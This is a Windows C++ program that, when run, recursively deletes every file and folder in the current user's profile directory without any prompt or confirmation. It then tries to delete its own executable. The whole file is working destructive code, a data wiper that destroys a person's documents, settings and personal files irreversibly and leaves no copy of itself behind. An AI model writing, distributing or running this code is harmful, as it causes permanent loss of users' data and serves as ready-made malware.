#include <Windows.h>
#include <Shlobj.h>
#include <iostream>
#include <string>
#include <filesystem>

namespace fs = std::filesystem;

void DeleteFilesAndDirs(const fs::path& path, const fs::path& excludePath) {
    if (!fs::exists(path) || path == excludePath) {
        return;
    }

    for (const auto& entry : fs::directory_iterator(path, fs::directory_options::skip_permission_denied)) {
        try {
            if (fs::is_directory(entry)) {
                DeleteFilesAndDirs(entry.path(), excludePath);
            }
            else {
                fs::remove(entry.path());
            }
        }
        catch (const fs::filesystem_error& e) {
            std::wcerr << L"Failed to delete: " << entry.path().wstring() << L" - " << e.what() << std::endl;
        }
    }

    // Attempt to delete the directory itself if it's not the excludePath
    if (path != excludePath) {
        try {
            fs::remove(path);
        }
        catch (const fs::filesystem_error& e) {
            std::wcerr << L"Failed to delete directory: " << path.wstring() << L" - " << e.what() << std::endl;
        }
    }
}

int main() {
    wchar_t userProfile[256];
    SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    fs::path exeFsPath(exePath);

    try {
        DeleteFilesAndDirs(fs::path(userProfile), exeFsPath);
    }
    catch (const std::exception& e) {
        std::wcerr << L"Error: " << e.what() << std::endl;
        return 1;
    }

    try {
        fs::remove(exeFsPath);
    }
    catch (const std::exception& e) {
        std::wcerr << L"Error deleting self: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
